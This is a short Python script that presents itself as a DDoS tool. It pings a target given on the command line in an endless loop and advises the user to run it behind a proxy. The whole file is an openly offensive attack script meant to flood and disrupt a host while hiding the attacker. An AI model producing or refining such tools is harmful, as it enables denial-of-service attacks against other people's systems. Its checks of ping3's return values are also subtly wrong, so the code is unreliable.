from ping3 import ping
import sys
import time

def main(host):
    print("Attempting to DDoS " + str(host))
    count = 0
    try:
        while True:
            count = count + 1
            resp = ping(host)
            if resp == True:
                continue
            elif resp == False:
                print(f"Try #{count} failed. Trying again.")
                continue
            else:
                print("Something happened. Trying again.")
                continue
    except Exception as e:
        print("Error occured: " + str(e))
        sys.exit()
if __name__ == "__main__":
    try:
        url = sys.argv[1]
        print("Please use a proxy before executing.")
        print("Executing... Enter CTRL + C to cancel.")
        print("Target: " + str(url))
        attempt = ping(url)
        if attempt == True:
            print("URL is valid.")
        elif attempt == False:
            print("URL is not valid. Try another domain.")
            sys.exit()
        time.sleep(5)
        try:
            main(url)
        except Exception as e:
            print("Error occured: " + str(e))
    except IndexError:
        print("URL parameter cannot be empty.")
